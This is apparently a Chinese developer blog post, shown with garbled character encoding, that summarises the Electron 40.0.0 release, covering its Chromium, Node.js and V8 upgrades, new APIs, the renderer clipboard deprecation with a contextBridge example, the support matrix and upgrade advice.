input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p>æˆ‘æ­£åœ¨å¼€å‘ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxun082%2FDocFlow" target="_blank" title="https://github.com/xun082/DocFlow" ref="nofollow noopener noreferrer">DocFlow</a>ï¼Œå®ƒæ˜¯ä¸€ä¸ªå®Œæ•´çš„ AI å…¨æ ˆååŒæ–‡æ¡£å¹³å°ã€‚è¯¥é¡¹ç›®èåˆäº†å¤šä¸ªæŠ€æœ¯æ ˆï¼ŒåŒ…æ‹¬åŸºäº <code>Tiptap</code> çš„å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ã€<code>NestJs</code> åç«¯æœåŠ¡ã€<code>AI</code> é›†æˆåŠŸèƒ½å’Œå®æ—¶åä½œã€‚åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæˆ‘ç§¯ç´¯äº†ä¸°å¯Œçš„å®æˆ˜ç»éªŒï¼Œæ¶µç›–äº† <code>Tiptap</code> çš„æ·±åº¦å®šåˆ¶ã€æ€§èƒ½ä¼˜åŒ–å’Œåä½œåŠŸèƒ½çš„å®ç°ç­‰æ ¸å¿ƒéš¾ç‚¹ã€‚</p>
</blockquote>
<p>å¦‚æœä½ å¯¹ AI å…¨æ ˆå¼€å‘ã€Tiptap å¯Œæ–‡æœ¬ç¼–è¾‘å™¨å®šåˆ¶æˆ– DocFlow é¡¹ç›®çš„å®Œæ•´æŠ€æœ¯æ–¹æ¡ˆæ„Ÿå…´è¶£ï¼Œæ¬¢è¿åŠ æˆ‘å¾®ä¿¡ <code>yunmz777</code> è¿›è¡Œç§èŠå’¨è¯¢ï¼Œè·å–è¯¦ç»†çš„æŠ€æœ¯åˆ†äº«å’Œæœ€ä½³å®è·µã€‚</p>
<p>å°±åœ¨ 2025 å¹´ 10 æœˆ 28 æ—¥ï¼ŒElectron å›¢é˜Ÿåˆšåˆšå‘å¸ƒäº† Electron 39.0.0 ç‰ˆæœ¬ï¼Œå¸¦æ¥äº† ASAR Integrity åŠŸèƒ½çš„ç¨³å®šåŒ–ã€Chromium 142 çš„å‡çº§ä»¥åŠä¸€ç³»åˆ—æ–°ç‰¹æ€§ã€‚è®¸å¤šå¼€å‘è€…è¿˜åœ¨ç†Ÿæ‚‰ 39 ç‰ˆæœ¬çš„åŠŸèƒ½å’Œç‰¹æ€§ï¼Œç‰¹åˆ«æ˜¯ ASAR Integrity è¿™ä¸ªä»å®éªŒæ€§åŠŸèƒ½è½¬ä¸ºç¨³å®šç‰ˆçš„é‡è¦å®‰å…¨ç‰¹æ€§ã€‚</p>
<p>ç„¶è€Œï¼Œä»…ä»…è¿‡äº†å¤§çº¦ä¸¤ä¸ªåŠæœˆï¼ŒElectron å›¢é˜Ÿå°±åœ¨ 2026 å¹´ 1 æœˆ 13 æ—¥å†æ¬¡å‘å¸ƒäº† Electron 40.0.0 ç‰ˆæœ¬ï¼è¿™ä¸ªå‘å¸ƒèŠ‚å¥ç¡®å®ä½“ç°äº† Electron å›¢é˜Ÿåœ¨æŠ€æœ¯è¿­ä»£ä¸Šçš„é«˜æ•ˆå’Œç§¯æã€‚ä» 39 ç‰ˆæœ¬åˆ° 40 ç‰ˆæœ¬ï¼Œä¸ä»…æ ¸å¿ƒæŠ€æœ¯æ ˆæœ‰äº†é‡å¤§å‡çº§ï¼Œè¿˜å¼•å…¥äº†ä¸€äº›æ–°çš„åŠŸèƒ½å’Œæ”¹è¿›ï¼ŒåŒæ—¶ä¹Ÿæœ‰ä¸€äº›éœ€è¦å¼€å‘è€…æ³¨æ„çš„ç ´åæ€§å˜æ›´ã€‚</p>
<h2 data-id="heading-0">æ ¸å¿ƒæŠ€æœ¯æ ˆå‡çº§</h2>
<p>Electron 40.0.0 çš„æ ¸å¿ƒæŠ€æœ¯æ ˆè¿›è¡Œäº†é‡å¤§å‡çº§ï¼š</p>
<ul>
<li>Chromiumï¼šä» 142.0.7444.52 å‡çº§åˆ° 144.0.7559.60</li>
<li>Node.jsï¼šä» v22.20.0 å‡çº§åˆ° v24.11.1</li>
<li>V8 å¼•æ“ï¼šä» 14.2 å‡çº§åˆ° 14.4</li>
</ul>
<p>è¿™äº›å‡çº§æ„å‘³ç€ Electron åº”ç”¨å°†è·å¾—æ›´å¥½çš„æ€§èƒ½ã€å®‰å…¨æ€§å’Œå¯¹æ–° Web æ ‡å‡†çš„æ”¯æŒã€‚ç‰¹åˆ«å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒNode.js ä» 22 ç‰ˆæœ¬ç›´æ¥è·³åˆ°äº† 24 ç‰ˆæœ¬ï¼Œè¿™æ˜¯ä¸€ä¸ªé‡å¤§å‡çº§ï¼Œå¸¦æ¥äº†æ›´å¤šç°ä»£åŒ–çš„ JavaScript ç‰¹æ€§å’Œæ€§èƒ½ä¼˜åŒ–ã€‚Chromium 144 çš„å‡çº§ä¹Ÿå¸¦æ¥äº†æœ€æ–°çš„æµè§ˆå™¨ç‰¹æ€§ã€å®‰å…¨è¡¥ä¸å’Œæ€§èƒ½æ”¹è¿›ã€‚</p>
<p>å¯¹æ¯” Electron 39 ç‰ˆæœ¬ï¼ˆChromium 142ã€Node.js 22.20.0ã€V8 14.2ï¼‰ï¼Œ40 ç‰ˆæœ¬åœ¨æŠ€æœ¯æ ˆä¸Šæœ‰äº†æ˜æ˜¾çš„è¿›æ­¥ï¼Œç‰¹åˆ«æ˜¯åœ¨ Node.js ç‰ˆæœ¬ä¸Šçš„è·¨è¶Šå¼å‡çº§ã€‚</p>
<h2 data-id="heading-1">æ–°åŠŸèƒ½å’Œæ”¹è¿›</h2>
<h3 data-id="heading-2">ç¡¬ä»¶åŠ é€Ÿæ£€æµ‹èƒ½åŠ›</h3>
<p>æ–°å¢äº† <code>app.isHardwareAccelerationEnabled()</code> æ–¹æ³•ï¼Œå…è®¸å¼€å‘è€…æ£€æµ‹ç¡¬ä»¶åŠ é€Ÿæ˜¯å¦å·²å¯ç”¨ã€‚è¿™ä¸ªåŠŸèƒ½åœ¨ Electron 39 ä¸­å°±å·²ç»å¼•å…¥ï¼Œåœ¨ 40 ç‰ˆæœ¬ä¸­ç»§ç»­å¯ç”¨ã€‚è¿™å¯¹äºéœ€è¦äº†è§£åº”ç”¨è¿è¡Œç¯å¢ƒçš„åœºæ™¯éå¸¸æœ‰ç”¨ï¼Œå¯ä»¥å¸®åŠ©å¼€å‘è€…æ›´å¥½åœ°ä¼˜åŒ–åº”ç”¨æ€§èƒ½ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å›¾å½¢å¯†é›†å‹ä»»åŠ¡æ—¶ã€‚</p>
<h3 data-id="heading-3">é«˜åŠ¨æ€èŒƒå›´ï¼ˆHDRï¼‰æ”¯æŒ</h3>
<p>åœ¨ç¦»å±æ¸²æŸ“ï¼ˆOffscreen Renderingï¼‰ä¸­æ–°å¢äº† RGBAF16 è¾“å‡ºæ ¼å¼ï¼Œæ”¯æŒ scRGB HDR è‰²å½©ç©ºé—´ã€‚è¿™ä¸ªåŠŸèƒ½åŒæ ·åœ¨ Electron 39 ä¸­å°±å·²ç»å¼•å…¥ï¼Œåœ¨ 40 ç‰ˆæœ¬ä¸­ç»§ç»­å®Œå–„ã€‚è¿™å¯¹äºéœ€è¦å¤„ç†é«˜åŠ¨æ€èŒƒå›´å†…å®¹çš„åª’ä½“åº”ç”¨æ¥è¯´æ˜¯ä¸€ä¸ªé‡è¦çš„æ”¹è¿›ï¼Œèƒ½å¤Ÿæä¾›æ›´ä¸°å¯Œçš„è§†è§‰ä½“éªŒï¼Œè®©åº”ç”¨èƒ½å¤Ÿæ›´å¥½åœ°å±•ç¤ºé«˜è´¨é‡çš„è§†é¢‘å’Œå›¾åƒå†…å®¹ã€‚</p>
<h3 data-id="heading-4">Linux ç³»ç»Ÿä¸»é¢˜è‰²æ”¯æŒ</h3>
<p>åœ¨ Linux å¹³å°ä¸Šæ–°å¢äº†é€šè¿‡ <code>systemPreferences.getAccentColor</code> è·å–ç³»ç»Ÿå¼ºè°ƒè‰²çš„èƒ½åŠ›ã€‚è¿™ä¸ªåŠŸèƒ½åœ¨ Electron 39 ä¸­å°±å·²ç»å¼•å…¥ï¼Œåœ¨ 40 ç‰ˆæœ¬ä¸­ç»§ç»­å¯ç”¨ã€‚è¿™ä½¿å¾— Electron åº”ç”¨èƒ½å¤Ÿæ›´å¥½åœ°ä¸ç³»ç»Ÿä¸»é¢˜é›†æˆï¼Œæä¾›æ›´ä¸€è‡´çš„ç”¨æˆ·ä½“éªŒã€‚è¿™ä¸ªåŠŸèƒ½åœ¨ macOS å’Œ Windows ä¸Šå·²ç»å­˜åœ¨ï¼Œç°åœ¨ Linux ç”¨æˆ·ä¹Ÿèƒ½äº«å—åˆ°åŒæ ·çš„ä½“éªŒã€‚</p>
<h3 data-id="heading-5">æ–‡ä»¶ç³»ç»Ÿ API æƒé™æŒä¹…åŒ–</h3>
<p>ç°åœ¨å¯ä»¥åœ¨ä¼šè¯ä¸­æŒä¹…åŒ– File System API çš„æˆæƒçŠ¶æ€ã€‚è¿™ä¸ªåŠŸèƒ½åœ¨ Electron 37ã€38ã€39 ç‰ˆæœ¬ä¸­å°±å·²ç»å¼•å…¥ï¼Œåœ¨ 40 ç‰ˆæœ¬ä¸­ç»§ç»­å®Œå–„ã€‚è¿™æ„å‘³ç€ç”¨æˆ·æˆäºˆçš„æ–‡ä»¶è®¿é—®æƒé™å¯ä»¥åœ¨åº”ç”¨é‡å¯åä¿æŒï¼Œå‡å°‘äº†é‡å¤æˆæƒçš„éº»çƒ¦ï¼Œæå‡äº†ç”¨æˆ·ä½“éªŒã€‚è¿™å¯¹äºéœ€è¦é¢‘ç¹è®¿é—®æ–‡ä»¶ç³»ç»Ÿçš„åº”ç”¨æ¥è¯´æ˜¯ä¸€ä¸ªå¾ˆå®ç”¨çš„æ”¹è¿›ã€‚</p>
<h3 data-id="heading-6">å¼€å‘è€…å·¥å…·è‡ªåŠ¨èšç„¦</h3>
<p>å½“æ£€æŸ¥å…ƒç´ æˆ–è§¦å‘æ–­ç‚¹æ—¶ï¼Œå¼€å‘è€…å·¥å…·ä¼šè‡ªåŠ¨èšç„¦ã€‚è¿™ä¸ªåŠŸèƒ½åœ¨ Electron 37ã€38ã€39 ç‰ˆæœ¬ä¸­å°±å·²ç»å¼•å…¥ï¼Œåœ¨ 40 ç‰ˆæœ¬ä¸­ç»§ç»­å¯ç”¨ã€‚è¿™ä¸ªå°æ”¹è¿›å¯ä»¥æ˜¾è‘—æå‡å¼€å‘ä½“éªŒï¼Œè®©è°ƒè¯•è¿‡ç¨‹æ›´åŠ æµç•…ï¼Œç‰¹åˆ«æ˜¯åœ¨ä½¿ç”¨å¤šä¸ªçª—å£è¿›è¡Œå¼€å‘æ—¶ã€‚</p>
<h3 data-id="heading-7">åŠ¨æ€ ESM å¯¼å…¥æ”¯æŒ</h3>
<p>åœ¨éä¸Šä¸‹æ–‡éš”ç¦»çš„é¢„åŠ è½½è„šæœ¬ä¸­æ”¯æŒåŠ¨æ€ ESM å¯¼å…¥ã€‚è¿™ä¸ªåŠŸèƒ½åœ¨ Electron 37ã€38ã€39 ç‰ˆæœ¬ä¸­å°±å·²ç»å¼•å…¥ï¼Œåœ¨ 40 ç‰ˆæœ¬ä¸­ç»§ç»­å¯ç”¨ã€‚è¿™ä¸ºå¼€å‘è€…æä¾›äº†æ›´çµæ´»çš„æ¨¡å—åŠ è½½æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯åœ¨éœ€è¦æ¡ä»¶åŠ è½½æ¨¡å—çš„åœºæ™¯ä¸­ï¼Œå¯ä»¥è®©ä»£ç ç»„ç»‡æ›´åŠ çµæ´»ã€‚</p>
<h3 data-id="heading-8">SF Symbol æ”¯æŒ</h3>
<p>æ›´æ–°äº† <code>nativeImage.createFromNamedImage</code> ä»¥æ”¯æŒ SF Symbol åç§°ã€‚è¿™ä¸ªåŠŸèƒ½åœ¨ Electron 39 ä¸­å°±å·²ç»å¼•å…¥ï¼Œåœ¨ 40 ç‰ˆæœ¬ä¸­ç»§ç»­å®Œå–„ã€‚SF Symbol æ˜¯ macOS å’Œ iOS ä¸Šçš„ç³»ç»Ÿå›¾æ ‡é›†ï¼Œè¿™ä¸ªæ”¹è¿›è®© Electron åº”ç”¨èƒ½å¤Ÿæ›´å¥½åœ°ä½¿ç”¨ç³»ç»ŸåŸç”Ÿå›¾æ ‡ï¼Œæä¾›æ›´åŸç”Ÿçš„è§†è§‰ä½“éªŒã€‚</p>
<h3 data-id="heading-9">è§†é¢‘å¸§å¯¼å…¥æ”¯æŒ</h3>
<p>æ–°å¢äº†å°†å¤–éƒ¨å…±äº«çº¹ç†å¯¼å…¥ä¸º VideoFrame çš„æ”¯æŒã€‚è¿™æ˜¯ Electron 40 ç‰ˆæœ¬çš„æ–°åŠŸèƒ½ã€‚è¿™å¯¹äºéœ€è¦å¤„ç†è§†é¢‘å†…å®¹çš„åª’ä½“åº”ç”¨æ¥è¯´æ˜¯ä¸€ä¸ªé‡è¦çš„åŠŸèƒ½å¢å¼ºï¼Œå¯ä»¥æ›´å¥½åœ°å¤„ç†è§†é¢‘æµå’Œå›¾åƒæ•°æ®ã€‚</p>
<h3 data-id="heading-10">å†…å­˜å›æ”¶æœºåˆ¶æ”¹è¿›</h3>
<p>æ–°å¢äº† "memory-eviction" ä½œä¸ºå­è¿›ç¨‹é€€å‡ºçš„å¯èƒ½åŸå› ã€‚è¿™æ˜¯ Electron 40 ç‰ˆæœ¬çš„æ–°åŠŸèƒ½ã€‚è¿™æœ‰åŠ©äºå¼€å‘è€…æ›´å¥½åœ°è¯Šæ–­å’Œç†è§£åº”ç”¨çš„å†…å­˜ç®¡ç†é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å†…å­˜å‹åŠ›æ—¶èƒ½å¤Ÿæ›´å‡†ç¡®åœ°å®šä½é—®é¢˜ã€‚</p>
<h3 data-id="heading-11">ç½‘ç»œè¯·æ±‚åè®®å¤„ç†å¢å¼º</h3>
<p>åœ¨ <code>net.request</code> ä¸­æ–°å¢äº† <code>bypassCustomProtocolHandlers</code> é€‰é¡¹ï¼Œæä¾›äº†æ›´ç»†ç²’åº¦çš„åè®®å¤„ç†æ§åˆ¶ã€‚è¿™ä¸ªåŠŸèƒ½åœ¨ Electron 38ã€39 ç‰ˆæœ¬ä¸­å°±å·²ç»å¼•å…¥ï¼Œåœ¨ 40 ç‰ˆæœ¬ä¸­ç»§ç»­å¯ç”¨ã€‚è¿™è®©å¼€å‘è€…å¯ä»¥æ›´ç²¾ç¡®åœ°æ§åˆ¶ç½‘ç»œè¯·æ±‚çš„è¡Œä¸ºï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†è‡ªå®šä¹‰åè®®æ—¶ã€‚</p>
<h3 data-id="heading-12">æ— éšœç¢åŠŸèƒ½å¢å¼º</h3>
<p>æ–°å¢äº†æ›´ç»†ç²’åº¦çš„æ— éšœç¢æ”¯æŒç®¡ç†æ–¹æ³•ï¼Œå¸®åŠ©å¼€å‘è€…æ›´å¥½åœ°å®ç°åº”ç”¨çš„æ— éšœç¢åŠŸèƒ½ã€‚è¿™ä¸ªåŠŸèƒ½åœ¨ Electron 37ã€38ã€39 ç‰ˆæœ¬ä¸­å°±å·²ç»å¼•å…¥ï¼Œåœ¨ 40 ç‰ˆæœ¬ä¸­ç»§ç»­å®Œå–„ã€‚è¿™å¯¹äºéœ€è¦æ»¡è¶³æ— éšœç¢æ ‡å‡†çš„åº”ç”¨æ¥è¯´æ˜¯ä¸€ä¸ªé‡è¦çš„æ”¹è¿›ã€‚</p>
<h3 data-id="heading-13">å¼ºè°ƒè‰²é‡ç½®åŠŸèƒ½</h3>
<p>ç°åœ¨å¯ä»¥é€šè¿‡ <code>window.setAccentColor(null)</code> å°†å¼ºè°ƒè‰²é‡ç½®ä¸ºè·Ÿéšç³»ç»Ÿè®¾ç½®ï¼Œæä¾›äº†æ›´çµæ´»çš„ä¸»é¢˜æ§åˆ¶ã€‚è¿™ä¸ªåŠŸèƒ½åœ¨ Electron 38ã€39 ç‰ˆæœ¬ä¸­å°±å·²ç»å¼•å…¥ï¼Œåœ¨ 40 ç‰ˆæœ¬ä¸­ç»§ç»­å¯ç”¨ã€‚è¿™è®©åº”ç”¨å¯ä»¥æ›´å¥½åœ°å“åº”ç”¨æˆ·çš„ç³»ç»Ÿä¸»é¢˜å˜åŒ–ã€‚</p>
<h2 data-id="heading-14">ç ´åæ€§å˜æ›´</h2>
<h3 data-id="heading-15">å‰ªè´´æ¿ API è®¿é—®å˜æ›´ï¼ˆå·²å¼ƒç”¨ï¼‰</h3>
<p>é‡è¦å˜æ›´ï¼šåœ¨æ¸²æŸ“è¿›ç¨‹ä¸­ç›´æ¥ä½¿ç”¨å‰ªè´´æ¿ API å·²è¢«å¼ƒç”¨ã€‚å¦‚æœéœ€è¦åœ¨æ¸²æŸ“è¿›ç¨‹ä¸­è°ƒç”¨å‰ªè´´æ¿ APIï¼Œåº”è¯¥å°† API è°ƒç”¨æ”¾åœ¨é¢„åŠ è½½è„šæœ¬ä¸­ï¼Œå¹¶ä½¿ç”¨ <code>contextBridge</code> API æš´éœ²ç»™æ¸²æŸ“è¿›ç¨‹ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªå®‰å…¨ç›¸å…³çš„å˜æ›´ï¼Œå»ºè®®å¼€å‘è€…å°½å¿«è¿ç§»ä»£ç ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âŒ ä¸æ¨èï¼šåœ¨æ¸²æŸ“è¿›ç¨‹ä¸­ç›´æ¥ä½¿ç”¨</span>
navigator.<span class="hljs-property">clipboard</span>.<span class="hljs-title function_">writeText</span>(<span class="hljs-string">'text'</span>);

<span class="hljs-comment">// âœ… æ¨èï¼šåœ¨é¢„åŠ è½½è„šæœ¬ä¸­ä½¿ç”¨ contextBridge</span>
<span class="hljs-comment">// preload.js</span>
<span class="hljs-keyword">const</span> { contextBridge, clipboard } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'electron'</span>);
contextBridge.<span class="hljs-title function_">exposeInMainWorld</span>(<span class="hljs-string">'electronAPI'</span>, {
  <span class="hljs-attr">writeText</span>: <span class="hljs-function">(<span class="hljs-params">text</span>) =&gt;</span> clipboard.<span class="hljs-title function_">writeText</span>(text)
});

<span class="hljs-comment">// renderer.js</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">electronAPI</span>.<span class="hljs-title function_">writeText</span>(<span class="hljs-string">'text'</span>);
</code></pre>
<p>è¿™ä¸ªå˜æ›´çš„ç›®çš„æ˜¯æé«˜åº”ç”¨çš„å®‰å…¨æ€§ï¼Œé€šè¿‡ contextBridge å¯ä»¥æ›´å¥½åœ°æ§åˆ¶æ¸²æŸ“è¿›ç¨‹å’Œä¸»è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼Œå‡å°‘æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚è¿™ä¸ Electron 39 ç‰ˆæœ¬ä¸­ ASAR Integrity ç¨³å®šåŒ–çš„å®‰å…¨å¯¼å‘æ˜¯ä¸€è‡´çš„ã€‚</p>
<h3 data-id="heading-16">macOS dSYM æ–‡ä»¶å‹ç¼©æ ¼å¼å˜æ›´</h3>
<p>macOS çš„è°ƒè¯•ç¬¦å·ï¼ˆdSYMï¼‰æ–‡ä»¶ç°åœ¨ä½¿ç”¨ xz å‹ç¼©æ ¼å¼ï¼Œä»¥å¤„ç†æ›´å¤§çš„æ–‡ä»¶å¤§å°ã€‚dsym.zip æ–‡ä»¶ç°åœ¨å˜æˆäº† dsym.tar.xz æ–‡ä»¶ã€‚ä½¿ç”¨è°ƒè¯•ç¬¦å·çš„å¼€å‘è€…å¯èƒ½éœ€è¦æ›´æ–°ä»–ä»¬çš„è§£å‹å·¥å…·ä»¥æ”¯æŒ xz æ ¼å¼ã€‚</p>
<p>è¿™ä¸ªå˜æ›´ä¸»è¦æ˜¯ä¸ºäº†å¤„ç†è¶Šæ¥è¶Šå¤§çš„è°ƒè¯•ç¬¦å·æ–‡ä»¶ï¼Œxz å‹ç¼©æ ¼å¼æä¾›äº†æ›´å¥½çš„å‹ç¼©ç‡ï¼Œä½†éœ€è¦å¼€å‘è€…æ›´æ–°å·¥å…·é“¾ã€‚</p>
<h2 data-id="heading-17">ä¸ Electron 39 ç‰ˆæœ¬çš„å¯¹æ¯”</h2>
<p>Electron 40 ç‰ˆæœ¬ç›¸æ¯” 39 ç‰ˆæœ¬çš„ä¸»è¦å˜åŒ–ï¼š</p>
<ol>
<li>
<p>æŠ€æœ¯æ ˆå‡çº§ï¼šChromium ä» 142 å‡çº§åˆ° 144ï¼ŒNode.js ä» 22.20.0 å‡çº§åˆ° 24.11.1ï¼ŒV8 ä» 14.2 å‡çº§åˆ° 14.4</p>
</li>
<li>
<p>æ–°åŠŸèƒ½ï¼šæ–°å¢äº†è§†é¢‘å¸§å¯¼å…¥æ”¯æŒå’Œå†…å­˜å›æ”¶æœºåˆ¶æ”¹è¿›ç­‰æ–°åŠŸèƒ½</p>
</li>
<li>
<p>åŠŸèƒ½å»¶ç»­ï¼šè®¸å¤šåœ¨ 39 ç‰ˆæœ¬ä¸­å¼•å…¥çš„åŠŸèƒ½åœ¨ 40 ç‰ˆæœ¬ä¸­ç»§ç»­å¯ç”¨å’Œå®Œå–„ï¼Œå¦‚ç¡¬ä»¶åŠ é€Ÿæ£€æµ‹ã€HDR æ”¯æŒã€Linux ä¸»é¢˜è‰²æ”¯æŒç­‰</p>
</li>
<li>
<p>ç ´åæ€§å˜æ›´ï¼šæ–°å¢äº†å‰ªè´´æ¿ API è®¿é—®çš„å¼ƒç”¨è­¦å‘Šï¼Œè¿™æ˜¯ 40 ç‰ˆæœ¬ç‰¹æœ‰çš„å˜æ›´</p>
</li>
<li>
<p>å®‰å…¨æ”¹è¿›ï¼šå»¶ç»­äº† 39 ç‰ˆæœ¬ä¸­ ASAR Integrity ç¨³å®šåŒ–çš„å®‰å…¨å¯¼å‘ï¼Œè¿›ä¸€æ­¥å¼ºåŒ–äº†åº”ç”¨å®‰å…¨æ€§</p>
</li>
</ol>
<h2 data-id="heading-18">ç‰ˆæœ¬æ”¯æŒæƒ…å†µ</h2>
<p>æ ¹æ® Electron çš„æ”¯æŒç­–ç•¥ï¼ŒElectron 37.x.y å·²ç»åˆ°è¾¾æ”¯æŒç»“æŸï¼ˆEnd-of-Supportï¼‰ã€‚å¼€å‘è€…å’Œåº”ç”¨åº”è¯¥å°½å¿«å‡çº§åˆ°æ›´æ–°çš„ç‰ˆæœ¬ã€‚</p>
<p>å½“å‰æ”¯æŒçš„ç‰ˆæœ¬çŸ©é˜µï¼š</p>

























<table><thead><tr><th>E40 (Jan'26)</th><th>E41 (Mar'26)</th><th>E42 (May'26)</th></tr></thead><tbody><tr><td>40.x.y</td><td>41.x.y</td><td>42.x.y</td></tr><tr><td>39.x.y</td><td>40.x.y</td><td>41.x.y</td></tr><tr><td>38.x.y</td><td>39.x.y</td><td>40.x.y</td></tr></tbody></table>
<p>å¯¹æ¯” Electron 39 ç‰ˆæœ¬å‘å¸ƒæ—¶çš„æ”¯æŒçŸ©é˜µï¼ˆE39ã€E40ã€E41ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°ç‰ˆæœ¬æ”¯æŒç­–ç•¥ä¿æŒç¨³å®šï¼ŒElectron å›¢é˜Ÿé€šå¸¸åŒæ—¶ç»´æŠ¤ä¸‰ä¸ªä¸»è¦ç‰ˆæœ¬ï¼Œæ¯ä¸ªç‰ˆæœ¬å¤§çº¦æ”¯æŒ 6 ä¸ªæœˆã€‚è¿™æ„å‘³ç€å¼€å‘è€…éœ€è¦ä¿æŒç›¸å¯¹é¢‘ç¹çš„å‡çº§èŠ‚å¥ï¼Œä»¥ç¡®ä¿åº”ç”¨çš„å®‰å…¨æ€§å’Œå…¼å®¹æ€§ã€‚</p>
<h2 data-id="heading-19">å‡çº§å»ºè®®</h2>
<p>å¯¹äºæ­£åœ¨ä½¿ç”¨ Electron çš„å¼€å‘è€…ï¼Œå»ºè®®ï¼š</p>
<ol>
<li>
<p>åŠæ—¶å‡çº§ï¼šå¦‚æœä½¿ç”¨çš„æ˜¯ Electron 37 æˆ–æ›´æ—©ç‰ˆæœ¬ï¼Œåº”è¯¥å°½å¿«å‡çº§åˆ° Electron 40ã€‚Electron 37 å·²ç»åˆ°è¾¾æ”¯æŒç»“æŸï¼Œä¸å†æ¥æ”¶å®‰å…¨æ›´æ–°ã€‚å¦‚æœæ­£åœ¨ä½¿ç”¨ Electron 39ï¼Œä¹Ÿå¯ä»¥è€ƒè™‘å‡çº§åˆ° 40 ç‰ˆæœ¬ä»¥è·å¾—æœ€æ–°çš„æŠ€æœ¯æ ˆå‡çº§ã€‚</p>
</li>
<li>
<p>æ£€æŸ¥ç ´åæ€§å˜æ›´ï¼šç‰¹åˆ«æ³¨æ„å‰ªè´´æ¿ API çš„ä½¿ç”¨ï¼Œéœ€è¦è¿ç§»åˆ°é¢„åŠ è½½è„šæœ¬æ¨¡å¼ã€‚è¿™ä¸ªå˜æ›´è™½ç„¶éœ€è¦ä¸€äº›ä»£ç è°ƒæ•´ï¼Œä½†å¯¹äºåº”ç”¨çš„å®‰å…¨æ€§æ˜¯æœ‰ç›Šçš„ã€‚</p>
</li>
<li>
<p>å……åˆ†åˆ©ç”¨æ–°åŠŸèƒ½ï¼šå¦‚æœåº”ç”¨æ¶‰åŠè§†é¢‘å¤„ç†ï¼Œå¯ä»¥åˆ©ç”¨æ–°çš„è§†é¢‘å¸§å¯¼å…¥æ”¯æŒã€‚å¦‚æœéœ€è¦æ›´å¥½çš„å†…å­˜ç®¡ç†ï¼Œå¯ä»¥åˆ©ç”¨æ–°çš„å†…å­˜å›æ”¶æœºåˆ¶æ”¹è¿›ã€‚</p>
</li>
<li>
<p>å……åˆ†æµ‹è¯•åº”ç”¨ï¼šå‡çº§åå……åˆ†æµ‹è¯•åº”ç”¨åŠŸèƒ½ï¼Œç‰¹åˆ«æ˜¯æ¶‰åŠæ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œè¯·æ±‚å’Œä¸»é¢˜ç›¸å…³çš„åŠŸèƒ½ã€‚æ–°ç‰ˆæœ¬å¯èƒ½å¸¦æ¥ä¸€äº›è¡Œä¸ºå˜åŒ–ï¼Œéœ€è¦ä»”ç»†éªŒè¯ã€‚</p>
</li>
<li>
<p>å…³æ³¨ç‰ˆæœ¬å‘å¸ƒèŠ‚å¥ï¼šä» 39 ç‰ˆæœ¬åˆ° 40 ç‰ˆæœ¬çš„å‘å¸ƒé—´éš”æ¥çœ‹ï¼ŒElectron å›¢é˜Ÿä¿æŒäº†ç¨³å®šçš„å‘å¸ƒèŠ‚å¥ã€‚å¼€å‘è€…åº”è¯¥å»ºç«‹æ›´çµæ´»çš„å‡çº§å’Œæµ‹è¯•æµç¨‹ï¼Œä»¥é€‚åº”è¿™ç§èŠ‚å¥ã€‚</p>
</li>
</ol>
<h2 data-id="heading-20">æœªæ¥å±•æœ›</h2>
<p>Electron å›¢é˜Ÿå°†ç»§ç»­ä¸“æ³¨äºè·Ÿä¸Šä¸»è¦ç»„ä»¶ï¼ˆChromiumã€Node.js å’Œ V8ï¼‰çš„å¼€å‘è¿›åº¦ï¼Œç¡®ä¿ Electron åº”ç”¨èƒ½å¤Ÿä½¿ç”¨æœ€æ–°çš„ Web æŠ€æœ¯å’Œæ€§èƒ½ä¼˜åŒ–ã€‚</p>
<p>ä» Electron 39 åˆ° 40 çš„ç‰ˆæœ¬è¿­ä»£å¯ä»¥çœ‹å‡ºï¼ŒElectron å›¢é˜Ÿåœ¨ä¿æŒç¨³å®šå‘å¸ƒèŠ‚å¥çš„åŒæ—¶ï¼Œä¹Ÿåœ¨ä¸æ–­å¼•å…¥æ–°æŠ€æœ¯æ ˆå‡çº§å’Œæ–°åŠŸèƒ½ã€‚ç‰¹åˆ«æ˜¯ Node.js 24 çš„å‡çº§ï¼Œæ˜¾ç¤ºäº† Electron å›¢é˜Ÿå¯¹æœ€æ–°æŠ€æœ¯çš„ç§¯æé‡‡ç”¨ã€‚å¼€å‘è€…éœ€è¦é€‚åº”è¿™ç§èŠ‚å¥ï¼Œå»ºç«‹æ›´çµæ´»çš„å‡çº§å’Œæµ‹è¯•æµç¨‹ã€‚</p>
